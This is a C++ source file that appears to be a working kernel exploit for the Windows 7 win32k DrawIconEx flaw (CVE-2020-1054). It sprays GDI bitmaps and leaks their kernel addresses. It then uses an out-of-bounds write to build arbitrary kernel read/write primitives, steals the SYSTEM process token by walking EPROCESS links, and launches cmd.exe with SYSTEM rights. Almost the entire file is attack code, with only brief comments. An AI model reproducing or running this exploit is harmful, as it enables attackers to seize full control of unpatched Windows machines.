// ConsoleApplication4.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <Windows.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include "leak.h"
#include "struct.h"


typedef struct _HEAD
{
    HANDLE h;
    DWORD  cLockObj;
} HEAD, * PHEAD;

typedef struct _THROBJHEAD
{
    HEAD h;
    PVOID pti;
} THROBJHEAD, * PTHROBJHEAD;


typedef struct _THRDESKHEAD
{
    THROBJHEAD h;
    PVOID    rpdesk;
    PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, * PTHRDESKHEAD;

HWND    hwndIcon1 = NULL;
PBYTE   pwndIcon1 = NULL;
PSHAREDINFO gSharedInfo = NULL;
unsigned long long MySecTokenAddr = NULL;
unsigned long long MyEPROCESSAddr = NULL;
unsigned long long SystemSecurityTokenAddr = NULL;

HBITMAP r1[9500] = {};
PVOID kr1[9500] = {};

HBITMAP r2[9500] = {};
PVOID kr2[9500] = {};

HBITMAP hManager;
HBITMAP hWorker;

byte data[0x6fe20] = { 0 };   //某些系统下可能是0x6fe18

byte backupdata[0x6fe20] = { 0 };

void backup()
{
    GetBitmapBits(hManager, sizeof(backupdata), data);
}

void recovery()
{
    SetBitmapBits(hManager, sizeof(backupdata), data);
}

void SetAddress(ULONG64 addr)
{
    memcpy(&data[0x6fe18], &addr, sizeof(ULONG64));
    SetBitmapBits(hManager, sizeof(data), data);
}
LONG WriteVirtual(ULONG64 dest, BYTE* src, DWORD len)
{
    SetAddress(dest);
    return SetBitmapBits(hWorker, len, src);
}
LONG ReadVirtual(ULONG64 src, BYTE* dest, DWORD len)
{
    SetAddress(src);
    return GetBitmapBits(hWorker, len, dest);
}

unsigned long long ReadPtrFromKernelMemory(unsigned long long addr) {
    ULONG64 ptr;
    ReadVirtual(addr, (BYTE*)&ptr, 8);
    return ptr;
}

void WriteKernelMemory(unsigned long long addr, LPWSTR content) {
    WriteVirtual(addr, (BYTE*)content, wcslen(content));
}

static int ReadKernelAddress(UINT64 qwAddress)
{
    ULONG ptr;
    ReadVirtual(qwAddress, (BYTE*)&ptr, 4);
    return ptr;
}

static BOOL xxInitExploitInfo(VOID)
{
    gSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32"), "gSharedInfo");
    return TRUE;
}

static BOOL xxCreateIconWindowEx(VOID)
{
    // icon
    HWND hwnd1 = CreateWindowExW(0,
        L"#32772",
        NULL,
        WS_MINIMIZE | WS_DISABLED,
        0,
        0,
        0,
        0,
        NULL,
        NULL,
        NULL,
        NULL);

    PSERVERINFO  psi = gSharedInfo->psi;
    PHANDLEENTRY phe = gSharedInfo->aheList;

    PBYTE pwnd1 = NULL;
    PBYTE pwnd2 = NULL;

    for (ULONG c = 0; c < psi->cHandleEntries; c++)
    {
        if ((HWND)(c | (((ULONG_PTR)phe[c].wUniq) << 16)) == hwnd1)
        {
            pwnd1 = (PBYTE)phe[c].phead;
            break;
        }
    }

    pwndIcon1 = pwnd1;
    hwndIcon1 = hwnd1;

    printf("[+]WND1: %p\n", pwndIcon1);
    return TRUE;
}

void FindSecurityTokens() {
    unsigned long long pti = (unsigned long long)(&((THRDESKHEAD*)pwndIcon1)->h.pti);
    printf("[*]Searching for current processes EPROCESS structure\n");

    unsigned long long ptiaddress = ReadPtrFromKernelMemory(pti);
    printf("\tptiaddress == %llx\n", ptiaddress);

    unsigned long long threadTagPointer = ReadPtrFromKernelMemory(ptiaddress);
    printf("\ttagTHREAD == %llx\n", threadTagPointer);

    unsigned long long kapcStateAddr = ReadPtrFromKernelMemory(threadTagPointer + OFFSET_APCADDR_WIN7);
    printf("\tkapc_stateAddr == %llx\n", kapcStateAddr);

    MyEPROCESSAddr = ReadPtrFromKernelMemory(kapcStateAddr + OFFSET_APCEPROCESS_WIN7);

    printf("\teprocess addr: 0x%llx\n", MyEPROCESSAddr);

    MySecTokenAddr = ReadPtrFromKernelMemory(MyEPROCESSAddr + OFFSET_SECTOKEN_WIN7);
    printf("\tOriginal security token pointer: 0x%llx\n", MySecTokenAddr);

    printf("[*]Searching for SYSTEM security token address\n");

    unsigned long long nextProc = ReadPtrFromKernelMemory(MyEPROCESSAddr + OFFSET_EPROCESSBLINK_WIN7) - OFFSET_EPROCESSBLINK_WIN7;
    printf("\tNext eprocess address: 0x%llx\n", nextProc);

    unsigned int pid = ReadKernelAddress(nextProc + OFFSET_EPROCESSPID_WIN7);
    printf("\tFound pid: 0x%X\n", pid);

    while (true) {
        nextProc = ReadPtrFromKernelMemory(nextProc + OFFSET_EPROCESSBLINK_WIN7) - OFFSET_EPROCESSBLINK_WIN7;
        printf("\tNext eprocess address: 0x%llx\n", nextProc);

        pid = ReadKernelAddress(nextProc + OFFSET_EPROCESSPID_WIN7);
        printf("\tFound pid: 0x%X\n", pid);
        //Step 9.2
        if (pid == 4) {
            printf("\ttarget process found!\n");
            SystemSecurityTokenAddr = ReadPtrFromKernelMemory(nextProc + OFFSET_SECTOKEN_WIN7);
            break;
        }
    }
}

int main(int argc, char* argv[])
{
    xxInitExploitInfo();
    xxCreateIconWindowEx();

    leak pleak;
    LoadLibrary(L"user32.dll");
    HDC r0 = CreateCompatibleDC(0x0);
    // CPR's original crash code called CreateCompatibleBitmap as follows
    // HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);
    // however all following calculations/reversing in this blog will 
    // generally use the below call, unless stated otherwise
    // this only matters if you happen to be following along with WinDbg

    //HBITMAP r1 = CreateCompatibleBitmap(r0, 0x6f000, 0x08);
    int TokenOffset = 0x208;
    int nSelect = 0;
    int nSelectj = 0;
    ULONG64 data;
    wchar_t strSysSecToken[5] = { 0x00 };

    for (UINT i = 0; i < 200; i++)
    {
        r2[i] = CreateCompatibleBitmap(r0, 0x51500, 0x100);
        kr2[i] = pleak.GetGdiKernelAddress(r2[i]);
    }

    for (UINT i = 0; i < 200; i++)
    {
        printf("[*]Bitmap KernelAddress:%p\n", kr2[i]);
    }

    for (UINT i = 0; i < 9500; i++)
    {
        r1[i] = CreateCompatibleBitmap(r0, 0x6f000, 0x08);
        kr1[i] = pleak.GetGdiKernelAddress(r1[i]);
    }

    for (UINT i = 0; i < 9500; i++)
    {
        printf("[*]Bitmap KernelAddress:%p\n", kr1[i]);
    }

    for (UINT i = 0; i < 200; i++)
    {
        for (UINT j = 0; j < 9500; j++)
        {
            //https://0xeb-bp.github.io/blog/2020/06/15/cve-2020-1054-analysis.html
            //1.baseSurfOBJ和SURFOBJ1相距0x100000000
            //2.SURFOBJ1,SURFOBJ2,SURFOBJ3相距0x70000
            if ((ULONGLONG)kr2[i] + 0x100000000 == (ULONGLONG)kr1[j] &&
                (ULONGLONG)kr1[j + 1] - (ULONGLONG)kr1[j] == 0x70000 &&
                (ULONGLONG)kr1[j + 2] - (ULONGLONG)kr1[j + 1] == 0x70000)
            {
                nSelect = i;
                nSelectj = j;
            }
        }
    }

    if (nSelect == 0)
        goto _exit;

    SelectObject(r0, r2[nSelect]);
    ////DrawIconEx(r0, 0x0, 0x0, (HICON)0x30000010003, 0x0, 0xfffffffffebffffc,
    ////    0x0, 0x0, 0x6);

    printf("[+]Ready to POC\n");
    printf("[+]i:%d j:%d\n", nSelect, nSelectj);
    printf("[+]base bitmap:%p\n", kr2[nSelect]);
    printf("[+]bitmap0:%p\n", kr1[nSelectj]);
    printf("[+]bitmap1:%p\n", kr1[nSelectj + 1]);
    printf("[+]bitmap2:%p\n", kr1[nSelectj + 2]);
    getchar();


    //SURFOBJ1经过0xb次循环，写入SURFOBJ1+0x70038(SURFOBJ1+0x70000为SURFOBJ2,0x38为sizlBitmap)
    DrawIconEx(
        // device context
        r0,
        // offset
       /* 0x8c0, */  // USE FOR POST KB PATCH
        0x900, // USE FOR PRE  KB PATCH
        // iteration count
        0xb,
        // handle
        (HICON)0x40000010003,
        // roughly writes per iteration
        0x0,
        // use to get oob
        0xffe00000,
        0x0,
        NULL,
        // mask
        0x1);

    hManager = r1[nSelectj + 1];
    hWorker = r1[nSelectj + 2];

    //备份，防止蓝屏
    backup();

    FindSecurityTokens();

    strSysSecToken[3] = (SystemSecurityTokenAddr >> 48) & 0xFFFF;
    strSysSecToken[2] = (SystemSecurityTokenAddr >> 32) & 0xFFFF;
    strSysSecToken[1] = (SystemSecurityTokenAddr >> 16) & 0xFFFF;
    strSysSecToken[0] = (SystemSecurityTokenAddr >> 0) & 0xFFFF;
    printf("Security token to steal: 0x%llx\n", SystemSecurityTokenAddr);
    //Step 9.4
    WriteVirtual(MyEPROCESSAddr + TokenOffset, (BYTE*)strSysSecToken, 4);

    printf("SYSTEM please.\n");
    system("cmd.exe");

    //恢复
    recovery();

_exit:
    getchar();
    return 0;
}